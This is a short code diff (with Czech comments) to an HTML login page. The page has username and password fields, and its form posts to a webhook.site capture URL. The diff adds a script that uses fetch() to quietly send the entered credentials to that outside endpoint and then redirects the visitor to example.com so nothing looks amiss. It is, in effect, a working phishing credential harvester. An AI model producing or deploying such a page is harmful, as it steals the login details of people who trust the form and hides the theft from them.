@@ -7,15 +7,24 @@
 </head>
 <body>
     
-    <form name="main" action="https://webhook.site/d96e9d61-52bb-4fa1-bab9-4a4a1098f33b" onsubmit="redirectTo('https://example.com')">
+    <form name="main" action="https://webhook.site/d96e9d61-52bb-4fa1-bab9-4a4a1098f33b" onsubmit="submitForm(event)">
         <input name="username" placeholder="Username">
         <input name="password" placeholder="Password" type="password">
         <button type="submit">Submit</button>
     </form>
    
     <script>
-        function redirectTo(url) {
-            window.location.href = url;
+        function submitForm(event) {
+            event.preventDefault(); // Zablokování výchozího chování formuláře
+
+            // Odeslání formuláře pomocí Fetch API
+            fetch(event.target.action, {
+                method: 'POST',
+                body: new URLSearchParams(new FormData(event.target)) // Převod formulářových dat na URL encoded string
+            }).then(() => {
+                // Po úspěšném odeslání formuláře přesměrování na požadovanou URL
+                window.location.href = 'https://example.com';
+            });
         }
     </script>
 </body>
